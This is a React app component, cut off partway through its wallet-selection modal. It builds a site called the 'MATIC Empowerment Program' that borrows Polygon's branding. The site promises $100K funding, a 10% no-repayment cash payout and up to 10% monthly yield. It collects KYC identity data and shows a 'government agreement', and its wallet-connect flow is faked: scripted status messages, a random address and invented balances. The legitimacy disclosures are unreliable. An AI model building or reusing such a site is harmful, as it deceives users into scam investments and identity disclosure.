/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect } from 'react';
import { ShieldCheck, Coins, ExternalLink, Inbox, Flame, ArrowUpRight, ArrowRight, HelpCircle, Trophy, BookOpen, UserCheck, Shield, CreditCard, Sparkles, TrendingUp } from 'lucide-react';
import Header from './components/Header';
import Hero from './components/Hero';
import HowItWorks from './components/HowItWorks';
import Benefits from './components/Benefits';
import OurMission from './components/OurMission';
import FAQ from './components/FAQ';
import EligibilityKyc from './components/EligibilityKyc';
import GovernmentAgreement from './components/GovernmentAgreement';
import SupportChat from './components/SupportChat';
import AdminPanel from './components/AdminPanel';
import Disbursement from './components/Disbursement';
import ProjectVision from './components/ProjectVision';
import Delegate from './components/Delegate';
import { ApplicationData, KycStep } from './types';

export default function App() {
  const [currentView, setCurrentView] = useState<string>('home');
  const [fundingAmount, setFundingAmount] = useState<number>(100000); // Default to $100K allocation
  const [application, setApplication] = useState<ApplicationData | null>(null);
  const [activeKycStep, setActiveKycStep] = useState<KycStep>(1);

  // Global Web3 Wallet Connection Modal states
  const [isWalletModalOpen, setIsWalletModalOpen] = useState(false);
  const [modalWalletType, setModalWalletType] = useState<string>('');
  const [modalNetwork, setModalNetwork] = useState<'polygon' | 'bsc'>('polygon');
  const [modalLoadingStep, setModalLoadingStep] = useState<number>(0); // 0 = idle, 1 = loading, 2 = switching, 3 = finalizing, 4 = success
  const [modalLoadingText, setModalLoadingText] = useState<string>('');

  const handleConnectWalletInModal = (walletType: string) => {
    setModalWalletType(walletType);
    setModalLoadingStep(1);
    setModalLoadingText(`Scanning for local ${walletType} extension hooks on EVM...`);
    
    setTimeout(() => {
      setModalLoadingStep(2);
      setModalLoadingText(`Requesting chain switch parameters to ${modalNetwork === 'polygon' ? 'Polygon Mainnet' : 'Binance Smart Chain (BSC)'}...`);
    }, 950);

    setTimeout(() => {
      setModalLoadingStep(3);
      setModalLoadingText('Exchanging cryptographically secured non-custodial POS handshake tokens...');
    }, 1850);

    setTimeout(() => {
      setModalLoadingStep(4);
      setModalLoadingText('Authentication verified! Syncing staker portfolio indexes...');
    }, 2650);

    setTimeout(() => {
      const hexAddress = '0x71C' + Math.floor(Math.random() * 1e16).toString(16).toUpperCase() + '49A1';
      localStorage.setItem('mep_active_wallet', hexAddress);
      localStorage.setItem('mep_active_wallet_type', walletType);
      localStorage.setItem('mep_active_wallet_network', modalNetwork === 'polygon' ? 'Polygon Mainnet' : 'Binance Smart Chain (BSC)');
      localStorage.setItem('mep_active_wallet_balance', modalNetwork === 'polygon' ? '250000' : '450');
      localStorage.setItem('mep_redirect_to_dashboard', 'true');
      
      setIsWalletModalOpen(false);
      setModalLoadingStep(0);
      setModalWalletType('');
      handleViewChange('disbursement');
    }, 3400);
  };

  // Initialize data from localStorage on mount
  useEffect(() => {
    const cachedApp = localStorage.getItem('mep_application_data');
    if (cachedApp) {
      try {
        const parsed = JSON.parse(cachedApp) as ApplicationData;
        setApplication(parsed);
        // If they have an active pending or approved state, default Kyc stepper back to tracker
        if (parsed.status === 'PENDING' || parsed.status === 'APPROVED' || parsed.status === 'REJECTED') {
          setActiveKycStep(parsed.status === 'REJECTED' ? 3 : 5);
        }
      } catch (e) {
        console.error('Error parsing cached application', e);
      }
    }

    const cachedFunding = localStorage.getItem('mep_requested_funding');
    if (cachedFunding) {
      const parsedAmount = parseInt(cachedFunding, 10);
      if (!isNaN(parsedAmount)) {
        setFundingAmount(parsedAmount);
      }
    }
  }, []);

  const handleSetFundingAmount = (amount: number) => {
    setFundingAmount(amount);
    localStorage.setItem('mep_requested_funding', amount.toString());
  };

  const handleUpdateApplication = (app: ApplicationData | null) => {
    setApplication(app);
    if (!app) {
      localStorage.removeItem('mep_application_data');
    } else {
      localStorage.setItem('mep_application_data', JSON.stringify(app));
    }
  };

  // Switch menus
  const handleViewChange = (view: string) => {
    setCurrentView(view);
    
    // Jump scroll to top to simulate page routing
    window.scrollTo({ top: 0, behavior: 'smooth' });

    // Custom view behaviors
    if (view === 'kyc') {
      if (application) {
        setActiveKycStep(application.status === 'REJECTED' ? 3 : 5);
      } else {
        setActiveKycStep(1);
      }
    }
  };

  return (
    <div className="min-h-screen flex flex-col justify-between bg-dark-bg text-gray-200 relative">
      
      {/* Background radial overlays */}
      <div className="glowing-bg-layer"></div>
      <div className="glowing-bg-layer-2"></div>

      {/* Header bar components */}
      <Header 
        currentView={currentView} 
        onViewChange={handleViewChange}
        onOpenSupport={() => {}}
        onOpenWalletModal={() => setIsWalletModalOpen(true)}
      />

      {/* Main Container */}
      <main className="flex-grow z-10 relative animate-fade-in">
        {currentView !== 'home' && (
          <div className="max-w-7xl mx-auto px-4 sm:px-6 pt-6 pb-2 text-left">
            <button
              onClick={() => handleViewChange('home')}
              className="inline-flex items-center space-x-2.5 px-5 py-3 bg-gradient-to-r from-[#170C3B] to-[#120731] hover:from-[#211252] hover:to-[#170A3D] border-2 border-[#8247E5]/60 hover:border-[#8247E5] rounded-xl text-white font-bold text-xs sm:text-xs tracking-widest uppercase transition-all shadow-[0_5px_15px_rgba(130,71,229,0.15)] hover:shadow-[0_5px_25px_rgba(130,71,229,0.35)] hover:-translate-y-0.5 active:scale-95 cursor-pointer group"
            >
              <span className="text-[#8247E5] group-hover:text-emerald-400 font-extrabold text-sm sm:text-base transition-colors leading-none">←</span>
              <span>BACK TO MAIN DASHBOARD</span>
            </button>
          </div>
        )}
        {currentView === 'home' && (
          <div className="space-y-16 pb-16">
            <Hero 
              onViewChange={handleViewChange} 
              onSetFundingAmount={handleSetFundingAmount}
              savedAmount={fundingAmount}
            />            {/* SERVING PROGRAM DIRECTORY (MENU) */}
            <div className="max-w-7xl mx-auto px-4 sm:px-6">
              <div className="bg-[#10092c]/95 border-2 border-[#8247E5]/70 rounded-3xl p-6 sm:p-8 shadow-[0_0_60px_rgba(130,71,229,0.35)] space-y-6">
                <div className="flex flex-col md:flex-row justify-between items-start md:items-center border-b border-[#8247E5]/30 pb-5 gap-4">
                  <div className="space-y-1.5 text-left">
                    <h2 className="text-xl sm:text-2xl lg:text-3xl font-display font-black text-white uppercase tracking-tight flex items-center gap-2">
                       <span className="relative flex h-4 w-4 shrink-0">
                         <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-purple-glow opacity-75"></span>
                         <span className="relative inline-flex rounded-full h-4 w-4 bg-[#9F7AEA]"></span>
                       </span>
                       <span className="text-transparent bg-clip-text bg-gradient-to-r from-white via-purple-glow to-blue-400">SERVING PROGRAM DIRECTORY MENU</span>
                    </h2>
                    <p className="text-xs text-gray-300 font-sans">Instantly toggle between live staker credentials, procedural SLA maps, the strategic program roadmap, and credit card disbursement options.</p>
                  </div>
                  <span className="text-[10px] font-mono uppercase bg-purple-brand/20 text-emerald-400 px-3 py-1 rounded border border-emerald-500/25 tracking-widest font-black self-start md:self-auto flex items-center space-x-1.5 shadow-[0_0_15px_rgba(16,185,129,0.15)] shrink-0">
                    <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span>
                    <span>Consolidated Sync Live</span>
                  </span>
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6">
                  {[
                    { id: 'how-it-works', label: 'HOW IT WORKS', desc: 'SLA procedural steps, node allocation matrices & validator requirements.', icon: BookOpen, color: 'border-purple-brand/30 hover:border-[#8247E5] bg-[#140b33]/40', pulseColor: 'bg-indigo-400' },
                    { id: 'kyc', label: 'KYC VERIFICATION', desc: 'Secure identity registries, biometric authorization & compliance rosters.', icon: UserCheck, color: 'border-purple-brand/30 hover:border-[#8247E5] bg-[#140b33]/40', pulseColor: 'bg-purple-glow' },
                    { id: 'benefits', label: 'BENEFITS MATRIX', desc: 'Custom core staking node projections and active transaction fee yield rates.', icon: Trophy, color: 'border-purple-brand/30 hover:border-[#8247E5] bg-[#140b33]/40', pulseColor: 'bg-[#3b82f6]' },
                    { id: 'mission', label: 'OUR CORE MISSION', desc: 'Long-term decentralized goals, global validator hardware & network security.', icon: Shield, color: 'border-purple-brand/30 hover:border-[#8247E5] bg-[#140b33]/40', pulseColor: 'bg-[#9f7aea]' },
                    { id: 'disbursement', label: 'PAYCARD & METHODS', desc: 'Physical credit card issuances, certified bank checks & instant loads.', icon: CreditCard, color: 'border-purple-brand/30 hover:border-[#8247E5] bg-[#140b33]/40', pulseColor: 'bg-emerald-400' },
                    { id: 'faq', label: 'POLYGON POOS FAQ', desc: 'Legal clearance indices, escrow regulations & community verification questions.', icon: HelpCircle, color: 'border-purple-brand/30 hover:border-[#8247E5] bg-[#140b33]/40', pulseColor: 'bg-[#f59e0b]' },
                    { id: 'vision', label: 'PROJECT ROADMAP & VISION', desc: 'Strategic bull run goals, heavy ecosystem investments & payment infrastructure.', icon: TrendingUp, color: 'border-purple-brand/50 hover:border-[#9b5de5] bg-[#1e104d] text-[#bfdbfe] font-bold shadow-[0_0_20px_rgba(130,71,229,0.15)]', pulseColor: 'bg-indigo-300' },
                    { id: 'delegate', label: 'DELEGATE & STAKE', desc: 'Connect Web3 dApp wallet directly to authorize MATIC delegation on nodes.', icon: Sparkles, color: 'border-emerald-500/50 hover:border-emerald-300 bg-emerald-500/10 text-emerald-300 font-bold shadow-[0_0_25px_rgba(16,185,129,0.25)]', pulseColor: 'bg-emerald-400' }
                  ].map((portal, idx) => {
                    const TargetIcon = portal.icon;
                    return (
                      <button
                        key={idx}
                        onClick={() => handleViewChange(portal.id)}
                        className={`p-6 sm:p-7 border-2 rounded-2xl text-left flex flex-col justify-between space-y-6 transition-all hover:shadow-[0_12px_35px_rgba(130,71,229,0.35)] hover:-translate-y-1 group active:scale-[0.97] cursor-pointer relative overflow-hidden ${portal.color}`}
                        style={{ minHeight: '190px' }}
                      >
                        {/* Interactive Dimming Ambient Light Overlay */}
                        <div className={`absolute top-0 right-0 w-32 h-32 opacity-10 group-hover:opacity-25 rounded-full blur-3xl pointer-events-none transition-opacity duration-500 ${portal.pulseColor}`}></div>
                        
                        <div className="flex justify-between items-center w-full relative z-10">
                          <div className="p-3 bg-[#8247E5]/15 rounded-2xl text-purple-glow group-hover:bg-[#8247E5] group-hover:text-white transition-all shadow-inner">
                            <TargetIcon className="w-5 h-5" />
                          </div>
                          
                          {/* Pulsing Beacon "Dimming Light" Prompt */}
                          <div className="flex items-center space-x-2 bg-black/40 px-3 py-1.5 rounded-full border border-white/5 shadow-inner">
                            <span className="relative flex h-2 w-2">
                              <span className={`animate-ping absolute inline-flex h-full w-full rounded-full opacity-75 ${portal.pulseColor}`}></span>
                              <span className={`relative inline-flex rounded-full h-2 w-2 ${portal.pulseColor}`}></span>
                            </span>
                            <span className="font-mono text-[9px] text-gray-400 group-hover:text-white transition-colors uppercase font-bold tracking-widest">Active Light</span>
                          </div>
                        </div>
                        
                        <div className="relative z-10 space-y-2.5">
                          <span className="font-display font-black text-xl sm:text-2xl tracking-wide text-white block leading-tight group-hover:text-purple-glow transition-all uppercase drop-shadow">
                            {portal.label}
                          </span>
                          <span className="text-xs text-gray-300 block leading-relaxed font-sans font-medium">
                            {portal.desc}
                          </span>
                        </div>
                      </button>
                    );
                  })}
                </div>
              </div>
            </div>

            {/* In-page landing preview blocks */}
            <div className="max-w-7xl mx-auto px-4 sm:px-6">
              <div className="h-[2px] bg-gradient-to-r from-transparent via-purple-brand/20 to-transparent"></div>
            </div>

            {/* Quick Process Preview */}
            <div className="max-w-7xl mx-auto px-4 sm:px-6 text-center space-y-4">
              <span className="text-[10px] font-mono tracking-widest text-[#2563EB] uppercase">
                Consensus Secured Pools
              </span>
              <h3 className="font-display font-black text-2xl text-white">Sponsoring Node Delegation Globally</h3>
              <p className="text-xs text-gray-400 max-w-lg mx-auto leading-relaxed">
                By participating in the MATIC Empowerment program, you help secure Polygon infrastructure. Review our process flow matrices and begin verification.
              </p>
              
              <div className="grid grid-cols-1 md:grid-cols-3 gap-6 pt-5 max-w-4xl mx-auto">
                <div className="p-4 bg-purple-card/25 border border-purple-brand/10 rounded-xl space-y-1 hover:border-purple-brand/35 transition-colors cursor-pointer" onClick={() => handleViewChange('how-it-works')}>
                  <span className="text-purple-glow font-display font-bold">10% Cash Take-Home</span>
                  <p className="text-xs text-gray-400 mt-1">Kept instantly for yourself to use freely with no loan repayments.</p>
                </div>
                <div className="p-4 bg-purple-card/25 border border-purple-brand/10 rounded-xl space-y-1 hover:border-purple-brand/35 transition-colors cursor-pointer" onClick={() => handleViewChange('how-it-works')}>
                  <span className="text-[#2563EB] font-display font-bold">90% Staked MATIC Core</span>
                  <p className="text-xs text-gray-400 mt-1">Acquired and delegated on premium secure validator nodes.</p>
                </div>
                <div className="p-4 bg-purple-card/25 border border-purple-brand/10 rounded-xl space-y-1 hover:border-purple-brand/35 transition-colors cursor-pointer" onClick={() => handleViewChange('how-it-works')}>
                  <span className="text-emerald-400 font-display font-bold">Up to 10% Monthly yield</span>
                  <p className="text-xs text-gray-400 mt-1">Claim compounding liquid dividends of transactions fee outputs.</p>
                </div>
              </div>
            </div>

          </div>
        )}

        {currentView === 'how-it-works' && <HowItWorks onViewChange={handleViewChange} />}
        {currentView === 'kyc' && (
          <EligibilityKyc 
            application={application} 
            onUpdateApplication={handleUpdateApplication}
            activeStep={activeKycStep}
            onStepChange={setActiveKycStep}
            fundingAmount={fundingAmount}
          />
        )}
         {currentView === 'benefits' && <Benefits onViewChange={handleViewChange} />}
        {currentView === 'legal-agreement' && (
          <GovernmentAgreement 
            application={application} 
            onViewChange={handleViewChange} 
          />
        )}
        {currentView === 'mission' && <OurMission />}
        {currentView === 'faq' && <FAQ />}
        {currentView === 'vision' && <ProjectVision onViewChange={handleViewChange} />}
        {currentView === 'disbursement' && (
          <Disbursement 
            application={application} 
            fundingAmount={fundingAmount} 
            onViewChange={handleViewChange} 
          />
        )}
        {currentView === 'delegate' && (
          <Delegate 
            onViewChange={handleViewChange} 
            savedAmount={fundingAmount} 
          />
        )}
      </main>

      {/* Global Polygon Ecosystem Footer */}
      <footer className="bg-[#04020B] border-t border-purple-brand/20 pt-12 pb-8 px-4 sm:px-6 z-10 relative">
        <div className="max-w-7xl mx-auto space-y-10">
          
          {/* Top row with branding and tags */}
          <div className="flex flex-col md:flex-row items-start md:items-center justify-between gap-6 pb-8 border-b border-purple-brand/15">
            <div className="space-y-2.5 text-left max-w-md">
              <div className="flex items-center space-x-2">
                {/* Accurate official Polygon SVG Emblem */}
                <svg 
                  viewBox="0 0 24 24" 
                  fill="none" 
                  className="w-5.5 h-5.5 text-purple-glow" 
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path 
                    d="M16.47 11.23a1.43 1.43 0 0 0-.71.18l-3.36 1.94a1.43 1.43 0 0 1-1.42 0L7.61 11.4a1.42 1.42 0 0 1-.71-1.23V6.29a1.42 1.42 0 0 1 .71-1.23l3.37-1.94a1.43 1.43 0 0 1 1.42 0l3.36 1.94a1.42 1.42 0 0 1 .71 1.23v2.33a.5.5 0 0 0 1 0V6.29a2.42 2.42 0 0 0-1.21-2.1l-3.36-1.94a2.43 2.43 0 0 0-2.42 0L7.13 4.19A2.42 2.42 0 0 0 5.91 6.3v3.87a2.42 2.42 0 0 0 1.21 2.1l3.37 1.94a2.43 2.43 0 0 0 2.42 0l3.36-1.94a2.42 2.42 0 0 0 1.21-2.1V7.94a1.43 1.43 0 0 1 .71-.18l3.36 1.94a1.43 1.43 0 0 1 .71 1.23v3.87a1.42 1.42 0 0 1-.71 1.23l-3.37 1.94a1.43 1.43 0 0 1-1.42 0l-3.36-1.94a1.42 1.42 0 0 1-.71-1.23V12.5a.5.5 0 0 0-1 0v2.33a2.42 2.42 0 0 0 1.21 2.1l3.36 1.94a2.43 2.43 0 0 0 2.42 0l3.37-1.94a2.42 2.42 0 0 0 .71-1.78v-3.87a2.42 2.42 0 0 0-1.21-2.1l-3.36-1.94a2.43 2.43 0 0 0-1.42-.02 1.43 1.43 0 0 0-1.54 1.3v3z" 
                    fill="#8247E5" 
                  />
                </svg>
                <span className="font-display font-bold text-white tracking-wide text-lg">MATIC EMPOWERMENT</span>
                <span className="text-[9px] font-mono select-none bg-purple-brand/10 px-1.5 py-0.5 rounded text-purple-glow border border-purple-brand/20 uppercase">
                  Validator Program
                </span>
              </div>
              <p className="text-xs text-gray-400 leading-relaxed font-sans">
                Legally securing the decentralized ledger of the Polygon blockchain ecosystem through sponsored, sovereign human delegation.
              </p>
            </div>

            <div className="flex flex-wrap gap-4 text-xs font-mono">
              <span className="inline-flex items-center space-x-1.5 text-purple-glow">
                <ShieldCheck className="w-4 h-4 text-emerald-400" />
                <span>SSL Cryptographic Escrow</span>
              </span>
              <span className="inline-flex items-center space-x-1.5 text-[#2563EB]">
                <Flame className="w-4 h-4 text-orange-400 animate-pulse" />
                <span>Sandbox Enclave Protection</span>
              </span>
            </div>
          </div>

          {/* Quick Links Quad-Grid */}
          <div className="grid grid-cols-2 md:grid-cols-4 gap-8 text-left text-xs font-sans">
            
            {/* Column 1 */}
            <div className="space-y-3">
              <h5 className="font-display font-medium text-[10px] sm:text-xs text-purple-glow uppercase tracking-widest font-mono">
                Polygon Documentation
              </h5>
              <ul className="space-y-2 text-gray-400">
                <li><a href="https://docs.polygon.technology/" target="_blank" rel="noreferrer" className="hover:text-white flex items-center space-x-1"><span>Developer Portal Docs</span><ArrowUpRight className="w-3 h-3 text-gray-500 shrink-0" /></a></li>
                <li><a href="https://wiki.polygon.technology/" target="_blank" rel="noreferrer" className="hover:text-white flex items-center space-x-1"><span>Polygon PoS Wiki</span><ArrowUpRight className="w-3 h-3 text-gray-500 shrink-0" /></a></li>
                <li><a href="https://polygon.technology/papers" target="_blank" rel="noreferrer" className="hover:text-white flex items-center space-x-1"><span>Ecosystem Whitepapers</span><ArrowUpRight className="w-3 h-3 text-gray-500 shrink-0" /></a></li>
                <li><a href="https://github.com/maticnetwork" target="_blank" rel="noreferrer" className="hover:text-white flex items-center space-x-1"><span>Core GitHub Repositories</span><ArrowUpRight className="w-3 h-3 text-gray-500 shrink-0" /></a></li>
              </ul>
            </div>

            {/* Column 2 */}
            <div className="space-y-3">
              <h5 className="font-display font-medium text-[10px] sm:text-xs text-purple-glow uppercase tracking-widest font-mono">
                Delegated Staking
              </h5>
              <ul className="space-y-2 text-gray-400">
                <li><a href="https://staking.polygon.technology/" target="_blank" rel="noreferrer" className="hover:text-white flex items-center space-x-1"><span>Polygon Staking Portal</span><ArrowUpRight className="w-3 h-3 text-gray-500 shrink-0" /></a></li>
                <li><a href="https://staking.polygon.technology/validators" target="_blank" rel="noreferrer" className="hover:text-white flex items-center space-x-1"><span>Active Validator Registry</span><ArrowUpRight className="w-3 h-3 text-gray-500 shrink-0" /></a></li>
                <li><a href="https://polygon.technology/" target="_blank" rel="noreferrer" className="hover:text-white flex items-center space-x-1"><span>POL Staking Dynamics</span><ArrowUpRight className="w-3 h-3 text-gray-500 shrink-0" /></a></li>
                <li><button onClick={() => { handleViewChange('home'); setTimeout(() => document.getElementById('hero-calculator')?.scrollIntoView({ behavior: 'smooth' }), 100); }} className="hover:text-white text-left font-sans">Staking Yield Calculator</button></li>
              </ul>
            </div>

            {/* Column 3 */}
            <div className="space-y-3">
              <h5 className="font-display font-medium text-[10px] sm:text-xs text-purple-glow uppercase tracking-widest font-mono">
                Scaling Solutions
              </h5>
              <ul className="space-y-2 text-gray-400">
                <li><a href="https://polygon.technology/polygon-zkevm" target="_blank" rel="noreferrer" className="hover:text-white flex items-center space-x-1"><span>Polygon zkEVM</span><ArrowUpRight className="w-3 h-3 text-gray-500 shrink-0" /></a></li>
                <li><a href="https://polygon.technology/agglayer" target="_blank" rel="noreferrer" className="hover:text-white flex items-center space-x-1"><span>Polygon AggLayer</span><ArrowUpRight className="w-3 h-3 text-gray-500 shrink-0" /></a></li>
                <li><a href="https://polygon.technology/miden" target="_blank" rel="noreferrer" className="hover:text-white flex items-center space-x-1"><span>Polygon Miden Rollup</span><ArrowUpRight className="w-3 h-3 text-gray-500 shrink-0" /></a></li>
                <li><a href="https://polygon.technology/" target="_blank" rel="noreferrer" className="hover:text-white flex items-center space-x-1"><span>Polygon ID Sovereign</span><ArrowUpRight className="w-3 h-3 text-gray-500 shrink-0" /></a></li>
              </ul>
            </div>

            {/* Column 4 */}
            <div className="space-y-3">
              <h5 className="font-display font-medium text-[10px] sm:text-xs text-purple-glow uppercase tracking-widest font-mono">
                Official Community
              </h5>
              <ul className="space-y-2 text-gray-400 font-sans">
                <li><a href="https://twitter.com/0xPolygon" target="_blank" rel="noreferrer" className="hover:text-white flex items-center space-x-1"><span>Twitter/X</span><ArrowUpRight className="w-3 h-3 text-gray-500 shrink-0" /></a></li>
                <li><a href="https://t.me/polygonofficial" target="_blank" rel="noreferrer" className="hover:text-white flex items-center space-x-1"><span>Telegram</span><ArrowUpRight className="w-3 h-3 text-gray-500 shrink-0" /></a></li>
                <li><a href="https://discord.com/invite/0xPolygon" target="_blank" rel="noreferrer" className="hover:text-white flex items-center space-x-1"><span>Discord</span><ArrowUpRight className="w-3 h-3 text-gray-500 shrink-0" /></a></li>
                <li><a href="https://forum.polygon.technology/" target="_blank" rel="noreferrer" className="hover:text-white flex items-center space-x-1"><span>Polygon Forum</span><ArrowUpRight className="w-3 h-3 text-gray-500 shrink-0" /></a></li>
              </ul>
            </div>

          </div>

          {/* Legal Compliance and Treasury Disclosure Footer */}
          <div className="pt-8 border-t border-purple-brand/10 space-y-3.5 text-center text-[10px] text-gray-500 leading-relaxed font-sans max-w-5xl mx-auto">
            <p className="uppercase text-[9px] font-mono text-gray-400 font-semibold tracking-wider">
              Legitimacy and Treasury Disclosure:
            </p>
            <p>
              The MATIC Empowerment Program is an independent community incentive organized under the leadership of accredited delegation validators. Funding provided under this program is facilitated through partner investment networks solely for the delegation of staking resources on the Polygon core POS consensus network. Payout of the 10% cash equivalent is structured specifically to incentivize long-term delegations, and is fully subject to governmental compliance auditing regulations including Form W-9 indices.
            </p>
            <p>
              © {new Date().getFullYear()} MATIC Empowerment Program. All rights reserved. Powered by Polygon validators to scale web3 security.
            </p>
          </div>

        </div>
      </footer>

      {/* Floating interactive virtual chat handler */}
      <SupportChat />

      {/* Floating testing console simulator panel */}
      <AdminPanel 
        application={application} 
        onUpdateApplication={handleUpdateApplication}
        onJumpToStep={setActiveKycStep}
        fundingAmount={fundingAmount}
      />

      {/* GLOBAL HIGH-FIDELITY WEB3 EVM NETWORK CONNECTIVITY MODAL */}
      {isWalletModalOpen && (
        <div id="web3-wallet-modal" className="fixed inset-0 z-[150] flex items-center justify-center p-4 overflow-y-auto">
          {/* Backdrop Blur Overlay */}
          <div 
            className="fixed inset-0 bg-black/80 backdrop-blur-md cursor-pointer transition-opacity"
            onClick={() => {
              if (modalLoadingStep === 0) setIsWalletModalOpen(false);
            }}
          />

          {/* Modal Card Pane */}
          <div className="relative w-full max-w-lg bg-[#0E0728] border-2 border-[#8247E5]/70 rounded-3xl p-6 sm:p-8 text-left shadow-[0_0_80px_rgba(130,71,229,0.5)] z-10 overflow-hidden transform transition-all duration-300">
            
            {/* Ambient Purple Backdrop Glow */}
            <div className="absolute top-0 right-0 w-48 h-48 bg-[#8247E5]/15 rounded-full blur-3xl pointer-events-none" />
            <div className="absolute bottom-0 left-0 w-48 h-48 bg-yellow-500/5 rounded-full blur-3xl pointer-events-none" />

            {/* Header */}
            <div className="flex justify-between items-start border-b border-purple-brand/20 pb-4 mb-6 relative z-10">
              <div>
                <h3 className="text-xl font-display font-black text-white uppercase tracking-wider flex items-center gap-2">
                  <span className="w-2.5 h-2.5 bg-[#8247E5] rounded-full animate-pulse" />
                  EVM Web3 Ledger Client
                </h3>
                <p className="text-xs text-gray-400 mt-1 font-sans">
                  Connect to authorized validator consensus portals securely
                </p>
              </div>
              {modalLoadingStep === 0 && (
                <button 
                  onClick={() => setIsWalletModalOpen(false)}
                  className="p-1 px-2.5 rounded-lg bg-white/5 text-gray-400 hover:text-white hover:bg-white/10 transition-colors text-sm font-bold font-mono border border-white/10"
                >
                  ESC
                </button>
              )}
            </div>

            {modalLoadingStep === 0 ? (
              <div className="space-y-6 relative z-10">
                {/* STEP 1: NETWORK SELECTION */}
                <div className="space-y-3">
                  <label className="text-[10px] font-mono uppercase tracking-widest text-[#8247E5] font-black block">
                    STEP 1: Select Active EVM Blockchain Network
                  </label>
                  <div className="grid grid-cols-2 gap-4">
                    
                    {/* Polygon Network Choice */}
                    <button
                      type="button"
                      onClick={() => setModalNetwork('polygon')}
                      className={`flex flex-col items-center justify-center p-4 rounded-2xl border-2 text-center transition-all cursor-pointer group hover:bg-[#120935] ${
                        modalNetwork === 'polygon' 
                          ? 'bg-[#150B40] border-[#8247E5] shadow-[0_0_15px_rgba(130,71,229,0.25)]' 
                          : 'bg-black/40 border-purple-brand/10 text-gray-400 hover:border-[#8247E5]/30'
                      }`}
                    >
                      <svg 
                        viewBox="0 0 24 24" 
                        fill="none" 
                        className="w-9 h-9 transition-transform duration-300 group-hover:scale-110" 
                        xmlns="http://www.w3.org/2000/svg"
                      >
                        <path 
                          d="M16.47 11.23a1.43 1.43 0 0 0-.71.18l-3.36 1.94a1.43 1.43 0 0 1-1.42 0L7.61 11.4a1.42 1.42 0 0 1-.71-1.23V6.29a1.42 1.42 0 0 1 .71-1.23l3.37-1.94a1.43 1.43 0 0 1 1.42 0l3.36 1.94a1.42 1.42 0 0 1 .71 1.23v2.33a.5.5 0 0 0 1 0V6.29a2.42 2.42 0 0 0-1.21-2.1l-3.36-1.94a2.43 2.43 0 0 0-2.42 0L7.13 4.19A2.42 2.42 0 0 0 5.91 6.3v3.87a2.42 2.42 0 0 0 1.21 2.1l3.37 1.94a2.43 2.43 0 0 0 2.42 0l3.36-1.94a2.42 2.42 0 0 0 1.21-2.1V7.94a1.43 1.43 0 0 1 .71-.18l3.36 1.94a1.43 1.43 0 0 1 .71 1.23v3.87a1.42 1.42 0 0 1-.71 1.23l-3.37 1.94a1.43 1.43 0 0 1-1.42 0l-3.36-1.94a1.42 1.42 0 0 1-.71-1.23V12.5a.5.5 0 0 0-1 0v2.33a2.42 2.42 0 0 0 1.21 2.1l3.36 1.94a2.43 2.43 0 0 0 2.42 0l3.37-1.94a2.42 2.42 0 0 0 .71-1.78v-3.87a2.42 2.42 0 0 0-1.21-2.1l-3.36-1.94a2.43 2.43 0 0 0-1.42-.02 1.43 1.43 0 0 0-1.54 1.3v3z" 
                          fill="#8247E5" 
                        />
                      </svg>
                      <span className="text-white text-xs font-display font-bold uppercase mt-2 block group-hover:text-[#8247E5] transition-colors">
                        Polygon PoS
                      </span>
                      <span className="text-[9px] font-mono text-purple-glow uppercase tracking-widest mt-0.5">
                        MATIC Mainnet
                      </span>
                    </button>

                    {/* BSC Network Choice */}
                    <button
                      type="button"
                      onClick={() => setModalNetwork('bsc')}
                      className={`flex flex-col items-center justify-center p-4 rounded-2xl border-2 text-center transition-all cursor-pointer group hover:bg-[#120935] ${
                        modalNetwork === 'bsc' 
                          ? 'bg-[#150B40] border-yellow-500 shadow-[0_0_15px_rgba(234,179,8,0.2)]' 
                          : 'bg-black/40 border-purple-brand/10 text-gray-400 hover:border-yellow-500/30'
                      }`}
                    >
                      <svg
                        viewBox="0 0 24 24"
                        fill="none"
                        className="w-9 h-9 transition-transform duration-300 group-hover:scale-110"
                        xmlns="http://www.w3.org/2000/svg"
                      >
                        <path
                          d="M12 2L4.5 9.5L12 17L19.5 9.5L12 2Z"
                          fill="#F3BA2F"
                          className="opacity-20"
                        />
                        <path
                          d="M12 2L9 5L12 8L15 5L12 2ZM9 5L4.5 9.5L9 14L10.5 12.5L7.5 9.5L10.5 6.5L9 5ZM12 8L10.5 9.5L12 11L13.5 9.5L12 8ZM15 5L13.5 6.5L16.5 9.5L13.5 12.5L15 14L19.5 9.5L15 5ZM9 14L12 17L15 14L12 11L9 14ZM12 17L10.5 18.5L12 20L13.5 18.5L12 17ZM9 14L7.5 15.5L12 20L16.5 15.5L15 14L12 17L9 14Z"
                          fill="#F3BA2F"
                        />
                      </svg>
                      <span className="text-white text-xs font-display font-bold uppercase mt-2 block group-hover:text-yellow-400 transition-colors">
                        Binance Chain
                      </span>
                      <span className="text-[9px] font-mono text-yellow-500 uppercase tracking-widest mt-0.5">
                        BSC Smart Contract
                      </span>
                    </button>

                  </div>
                </div>

                {/* STEP 2: WALLET SELECTOR */}
                <div className="space-y-3">
                  <label className="text-[10px] font-mono uppercase tracking-widest text-[#8247E5] font-black block">
                    STEP 2: Select Secure Handshake Provider Client
                  </label>
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                    {[
                      { id: 'MetaMask', name: 'MetaMask Wallet', desc: 'Sovereign browser module' },
                      { id: 'Trust Wallet', name: 'Trust Wallet App', desc: 'Secure mobile multi-chain' },
                      { id: 'Binance Web3 Wallet', name: 'Binance Web3 Vault', desc: 'Direct exchange bridge' },
                      { id: 'Coinbase Wallet', name: 'Coinbase Wallet', desc: 'Enterprise node vault' }
                    ].map((wallet) => (
                      <button
                        key={wallet.id}
                        type="button"
                        onClick={() => handleConnectWalletInModal(wallet.id)}
                        className="text-left p-3.5 bg-black/45 border border-purple-brand/15 rounded-xl hover:border-[#8247E5] hover:bg-gradient-to-r hover:from-purple-brand/10 hover:to-purple-brand/5 transition-all text-white font-medium text-xs duration-200 cursor-pointer flex justify-between items-center group active:scale-95"
                      >
                        <div>
                          <span className="font-display font-extrabold text-[#D1D5DB] group-hover:text-white block">
                            {wallet.name}
                          </span>
                          <span className="text-[10px] text-gray-400 block mt-0.5">
                            {wallet.desc}
                          </span>
                        </div>
                        <span className="text-[#8247E5] opacity-50 group-hover:opacity-100 group-hover:translate-x-0.5 transition-all font-bold">→</span>
                      </button>
                    ))}
